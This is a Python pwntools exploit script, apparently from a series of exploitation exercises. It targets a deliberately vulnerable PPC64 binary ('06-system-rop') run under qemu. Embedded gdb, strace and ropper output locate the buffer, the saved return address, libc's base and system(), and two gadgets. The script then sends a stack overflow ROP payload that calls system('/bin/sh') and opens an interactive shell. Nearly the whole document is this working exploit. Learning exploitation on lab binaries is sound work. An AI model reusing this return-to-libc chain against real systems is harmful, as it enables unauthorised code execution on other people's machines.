#!/usr/bin/python

"""
(gdb) disassemble vulnerable 
Dump of assembler code for function vulnerable:
   0x0000000010000734 <+0>:	mflr    r0
   0x0000000010000738 <+4>:	std     r0,16(r1)
...
   0x0000000010000794 <+96>:	ld      r0,16(r1)
   0x0000000010000798 <+100>:	mtlr    r0
   0x000000001000079c <+104>:	ld      r31,-8(r1)
   0x00000000100007a0 <+108>:	blr
   0x00000000100007a4 <+112>:	.long 0x0
   0x00000000100007a8 <+116>:	.long 0x1
   0x00000000100007ac <+120>:	lwz     r0,1(r1)
End of assembler dump.
(gdb) b vulnerable 
Breakpoint 1 at 0x10000748: file src/06-system-rop.c, line 6.
(gdb) b *0x0000000010000794
Breakpoint 2 at 0x10000794: file src/06-system-rop.c, line 11.
(gdb) b *0x00000000100007a0
Breakpoint 3 at 0x100007a0: file src/06-system-rop.c, line 11.
(gdb) c
Continuing.

Breakpoint 1, vulnerable () at src/06-system-rop.c:6
6		printf("> ");
(gdb) p &buffer[0]
$1 = 0x40007ff940 ""
(gdb) c
Continuing.

Breakpoint 2, 0x0000000010000794 in vulnerable () at src/06-system-rop.c:11
11	}
(gdb) p/x $r1+16
$2 = 0x40007ff9e0
(gdb) c
Continuing.

Breakpoint 3, 0x00000000100007a0 in vulnerable () at src/06-system-rop.c:11
11	}
(gdb) i r $r1
r1             0x40007ff9d0	274886293968
(gdb) maintenance print msymbols
...
[2445] D 0x4000aa5e70 system section .opd
...
(gdb) x/3gx 0x4000aa5e70
0x4000aa5e70 <system>:	0x00000040008f7ba0	0x0000004000abc300
0x4000aa5e80 <system+16>:	0x0000000000000000
"""

"""
$ qemu-ppc64 -L /usr/powerpc64-linux-gnu/ -strace ./bin/ppc64/06-system-rop
...
29507 openat(AT_FDCWD,"/lib/libc.so.6",O_RDONLY|O_CLOEXEC) = 3
...
29507 mmap(NULL,2381768,PROT_EXEC|PROT_READ,MAP_PRIVATE|MAP_DENYWRITE,3,0) = 0x0000004000875000
...
"""

"""
$ ropper --nocolor --arch PPC64 --file /usr/powerpc64-linux-gnu/lib/libc-2.27.so
0x00185b54: ld r2, 0x28(r1); ld r0, 0x80(r1); addi r1, r1, 0x70; mtlr r0; blr;
0x000ae6a0: ld r0, 0x80(r1); ld r3, 0xa8(r1); mtlr r0; addi r1, r1, 0x70; blr;
"""

import struct
import sys

from pwn import *

context(arch='powerpc64', os='linux', endian='big', word_size=64)

binary_path = './bin/ppc64/06-system-rop'
libc_path = '/usr/powerpc64-linux-gnu/lib/libc-2.27.so'

saved_pc_addr = 0x40007ff9e0
buffer_addr = 0x40007ff940
libc_addr = 0x0000004000875000
system_addr = 0x00000040008f7ba0
r2_value = 0x0000004000abc300

ld_r0_r2_blr_addr = libc_addr + 0x00185b54
ld_r0_r3_blr_addr = libc_addr + 0x000ae6a0

libc = ELF(libc_path)
bin_sh_addr = libc_addr + libc.search('/bin/sh\x00').next()

p = process(binary_path)
#p = gdb.debug([binary_path])

payload = ''
payload += 'a' * (saved_pc_addr - buffer_addr)
payload += p64(ld_r0_r2_blr_addr)
# <- $r1 + 24
payload += 'b' * (0x28 - 24)
payload += p64(r2_value)
payload += 'c' * (0x80 - 0x28 - 8)
payload += p64(ld_r0_r3_blr_addr)
# <- $r1 + 24
payload += 'd' * (0x80 - 24)
payload += p64(system_addr)
payload += 'e' * (0xa8 - 0x80 - 8)
payload += p64(bin_sh_addr)

p.readuntil('> ')
p.write(payload)
p.interactive()
